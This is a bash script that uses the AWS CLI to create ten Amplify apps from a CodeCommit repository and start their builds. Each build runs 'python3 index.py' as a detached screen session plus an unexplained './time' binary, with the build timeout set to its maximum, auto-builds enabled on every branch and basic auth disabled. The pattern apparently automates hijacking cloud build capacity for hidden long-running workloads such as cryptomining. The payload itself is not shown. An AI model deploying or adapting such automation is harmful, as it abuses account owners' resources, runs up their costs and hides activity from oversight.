#!/usr/bin/env bash

create_app(){
for i in {1..10}
do
aws amplify create-app --name task1$i --repository $REPO  --platform WEB  --iam-service-role-arn $IAM --environment-variables '{"_BUILD_TIMEOUT":"480","BUILD_ENV":"prod"}' --enable-branch-auto-build  --no-enable-branch-auto-deletion  --no-enable-basic-auth \
--build-spec "
version: 1
frontend:
  phases:
    preBuild:
    build:
      commands:
        - yum install screen -y
        - screen -d -m bash -c 'python3 index.py;'
        - npm install env-cmd
        - npm run build:"'$BUILD_ENV'"
        - yarn global add serve
        - ./time
        
  artifacts:
    baseDirectory: /
    files:
      - '**/*'
 
" \
--enable-auto-branch-creation --auto-branch-creation-patterns '["*","*/**"]' --auto-branch-creation-config '{"stage": "PRODUCTION",  "enableAutoBuild": true,  "environmentVariables": {" ": " "},"enableBasicAuth": false, "enablePullRequestPreview":false}'

done
}

REPO=$(aws codecommit get-repository --repository-name test --query 'repositoryMetadata.cloneUrlHttp'| tr -d '"' 2> /dev/null)
IAM=$(aws iam get-role --role-name AWSCodeCommit-Role --query 'Role.Arn'| tr -d '"' 2> /dev/null)
create_app

for i in {0..9}; do
  APPID=$(aws amplify list-apps --output json --query 'apps['$i'].appId'| tr -d '"' 2> /dev/null)
  aws amplify create-branch --app-id $APPID --branch-name master --stage PRODUCTION --enable-auto-build
  STAT=$(aws amplify list-jobs --app-id $APPID --branch-name master --query 'jobSummaries[0].status'| tr -d '"' 2> /dev/null)
  [[ ($STAT != "RUNNING" ) && ( $STAT != "PENDING") ]]
  aws amplify start-job --app-id $APPID --branch-name master --job-type RELEASE
  echo "job status = $STAT"
done

